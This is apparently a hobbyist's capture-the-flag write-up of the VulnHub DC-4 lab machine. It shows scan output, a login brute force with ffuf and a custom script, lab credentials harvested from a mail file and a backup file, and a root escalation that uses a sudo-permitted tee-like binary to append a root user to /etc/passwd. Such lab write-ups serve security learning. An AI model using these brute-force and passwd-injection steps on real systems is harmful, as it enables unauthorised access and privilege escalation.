# BOX NAME: DC-4
**LINK**: https://www.vulnhub.com/entry/dc-4,313/

<details open><summary><ins>SUMMARY</ins></summary>

```
1. Enumerate remote, pull hair. Throw a hail-mary bruteforce, get lucky.
2. Exploit command.php, change request and get a reverse shell.
3. Enumerate local, find passwords backup-file. Brute SSH.
4. Pivot to other user, exploit GFTO-bin

I was seriously doubting my skills on this box. Once I brute-forced the login page the credentials "found" were the wrong ones since the login page redirected back to index, and just changed the cookie. Next login-attempt would come back as valid, which in ffuf shows the wrong credentials. So I was able pretty soon to exploit the machine but it bugged me I couldn't "log back in". 
So I went back, looked at all the responses in detail until I figured it out. So I updated my own bruteforce-script to spit out the last used credentials before the cookie changed and the next login-attempt came back as valid.

I could've just looked grabbed FFUF's ouput and thrown that into an output file, searched for the first changed size of the response and looked at the attempt before that. Well, anyway.. It was fun learning and changing my script too.
```
</details>

# REMOTE ENUMERATION:

<details><summary><ins>TARGET</ins></summary>

```
[+] IP:		10.77.0.66
[+] URL:	http://dc-4
```
</details>
<details><summary><ins>NMAP</ins></summary>

```
└─$ nmap -sV -sC $IP -oN nmap-dc4.log
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-01 09:21 CEST
Nmap scan report for dc.local (10.77.0.66)
Host is up (0.0014s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d6057066c27e02f762ce642c001ba25 (RSA)
|   256 e7838cd7bb84f32ee8a25f796f8e1930 (ECDSA)
|_  256 fd39478a5e58339973739e227f904f4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-server-header: nginx/1.15.10
|_http-title: System Tools
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.03 seconds

```
</details>
<details><summary><ins>WEB</ins></summary>

whatweb-scan
```
└─$ whatweb $URL --log-verbose=whatweb-dc4.log --follow-redirect=always                           
http://dc-4/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.15.10], IP[10.77.0.66], PasswordField[password], Title[System Tools], nginx[1.15.10]

```

nikto-scan
```
└─$ nikto -h $URL | tee nikto-dc4.log
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.77.0.66
+ Target Hostname:    dc-4
+ Target Port:        80
+ Start Time:         2023-05-01 09:21:25 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.15.10
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /login.php: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /#wp-config.php#: #wp-config.php# file found. This file contains the credentials.
+ 7850 requests: 0 error(s) and 4 item(s) reported on remote host
+ End Time:           2023-05-01 09:22:05 (GMT2) (40 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

fuzzing
//Burp
```
└─$ ffuf -u $URL/FUZZ -w /base/wordlists/web-fuzz/combined_files.txt -s -x .php,.txt,.html,.zip,.gz,.tar | tee ffuf-files-dc4.log
#nothing

└─$ ffuf -u $URL/FUZZ/ -w /base/wordlists/web-fuzz/combined_directories.txt -s | tee ffuf-dir-dc4.log
/css
/images
/
/.

auth bypass on the login. 
got nothing..
```

sqlmap
```
GOT NOTHING. WHAT?!
```

'HailMary attempt'
```
└─$ ffuf -request request.txt -u $URL/login.php -X POST -d "username=FUZZNAMES&password=FUZZPASS" -w /base/wordlists/names/xato-10mil.txt.mini:FUZZNAMES -w /base/wordlists/password/rockyou.txt:FUZZPASS -b "PHPSESSID=1iqf1f6thj6ia4p534399blc61" -H "User-Agent: pwnu?" -x http://127.0.0.1:8080 -t 200 -fs 206

since even if it's a successful login the page redirects back to index.php I modified my web-bruter.py to give me the last used credentials. Which turned out to be:

└─$ time python3 web-bruter.py -H $URL/login.php -U /base/wordlists/names/xato-10mil.txt.mini -P /base/wordlists/password/john-password.txt -f1 username -f2 password -C PHPSESSID="3ueouboq0arr9si13433p4pau2"

Tried admin:happy                    | so far we've done 35552 attempts
## SUCCESS ##
                                                                                                                                                                                                                                            
## Login Found ## 
 admin:happy                                                                                 

real    129.22s
user    58.72s
sys     28.28s
cpu     67%
```

</details>
<details><summary><ins>OTHER</ins></summary>

SSH (Port 22)
```

```

DNS (Port 53)
```

```

</details>


# LOCAL ENUMERATION:

<details><summary><ins>FILES OF INTEREST</ins></summary>

**FILES**:
```
/var/mail/jim
```

**SUID's**:

```
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/sbin/exim4
/bin/mount
/bin/umount
/bin/su
/bin/ping
/home/jim/test.sh  <-- I tried messing with this but by changing it i also changed the permissions.

```
**SGID's**:

```
/usr/bin/expiry
/usr/bin/dotlock.mailutils
/usr/bin/wall
/usr/bin/dotlockfile
/usr/bin/chage
/usr/bin/bsd-write
/usr/bin/ssh-agent
/usr/bin/crontab
/sbin/unix_chkpwd
```
**OTHERS**:

```
/home/jim/test.sh
/home/jim/backups/old-passwords.bak
/var/mail/jim

[22][ssh] host: 10.77.0.66   login: jim   password: jibril04
```
```
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles

```
</details>

<details><summary><ins>USEFUL INFORMATION:</ins></summary>

**Kernel Info:**
*file /bin/bash ; echo -e " \\n" && lsb_release -a ; echo -e "\\n" && uname -a*

```
/bin/bash: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=b533e7ee1f1588ddb63ceeea8554c15f42c75966, stripped
 

No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 9.8 (stretch)
Release:        9.8
Codename:       stretch


uname: invalid option -- '*'
Try 'uname --help' for more information.

```
</details>

<details><summary><ins>CREDS:</ins></summary>

```
username:password

admin:happy
sam
jim:jibril04
charles:^xHhA&hvim0y
```
</details>

<details><summary><ins>HASHES:</ins></summary>

```

```
</details>

# Proofs

<details><summary><ins>Proofs</ins></summary>

Final payload:
```
/etc/passwd exploit:

charles@dc-4:/tmp$ openssl passwd -1 -salt pwnu nuked$1$pwnu$MZW1Fhe0G2102wwDfZSCY0
charles@dc-4:/tmp$ sudo /usr/bin/teehee -a /etc/passwd
pwnu:$1$pwnu$MZW1Fhe0G2102wwDfZSCY0:0:0:pwnu:/home/pwnu:/bin/bash
```

```
root@dc-4:/tmp# cat /root/flag.txt



888       888          888 888      8888888b.                             888 888 888 888 
888   o   888          888 888      888  "Y88b                            888 888 888 888 
888  d8b  888          888 888      888    888                            888 888 888 888 
888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 


Congratulations!!!

Hope you enjoyed DC-4.  Just wanted to send a big thanks out there to all those
who have provided feedback, and who have taken time to complete these little
challenges.

If you enjoyed this CTF, send me a tweet via @DCAU7.
``` 

</details>